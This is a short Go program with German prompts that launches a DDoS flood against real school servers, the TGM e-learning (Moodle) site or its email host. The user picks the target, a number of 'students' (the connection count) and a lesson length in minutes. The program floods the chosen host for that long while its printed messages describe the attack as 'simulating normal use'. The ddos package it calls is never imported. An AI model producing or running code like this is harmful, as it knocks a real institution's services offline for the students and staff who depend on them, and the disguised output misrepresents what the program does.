package main

import (
	"fmt"
	"time"
)

func main() {
	students := 1000
	lesson := 600
	target := 1
	fmt.Print("Lieblingsseite der TGM Schüler:\n1) Moodle\n2) Email\nAntwort: ")
	fmt.Scan(&target)
	fmt.Print("Schüler am TGM: ")
	fmt.Scan(&students)
	fmt.Print("Dauer des Unterrichts (in min): ")
	fmt.Scan(&lesson)
	if target == 1 {
		d, err := ddos.New("https://elearning.tgm.ac.at:443", students)
		if err != nil {
			panic(err)
		}
		d.Run()
		fmt.Println("Simuliere normale Nutzung auf https://elearning.tgm.ac.at von", students, "TGM Schülern für", lesson, "Minuten.")
		time.Sleep(time.Duration(lesson) * time.Minute)
		d.Stop()
		fmt.Println("https://elearning.tgm.ac.at wurde erfolgreich von", students, "Schülern genutzt")
	} else if target == 2 {
		d, err := ddos.New("https://sophos.tgm.ac.at:443", students)
		if err != nil {
			panic(err)
		}
		d.Run()
		fmt.Println("Simuliere normale Nutzung auf https://sophos.tgm.ac.at von", students, "TGM Schülern für", lesson, "Minuten.")
		time.Sleep(time.Duration(lesson) * time.Minute)
		d.Stop()
		fmt.Println("https://sophos.tgm.ac.at wurde erfolgreich von", students, "Schülern genutzt")
	} else {
		panic(target)
	}
	/*d, err := ddos.New("https://elearning.tgm.ac.at:443", students)
	if err != nil {
		panic(err)
	}*/
	//d.Run()
	//fmt.Println("Simuliere normale Nutzung auf https://elearning.tgm.ac.at von", students, "TGM Schülern für", lesson, "Minuten.")
	//time.Sleep(time.Duration(lesson) * time.Minute)
	//d.Stop()
	//fmt.Println("https://elearning.tgm.ac.at wurde erfolgreich von", students, "Schülern genutzt")
}
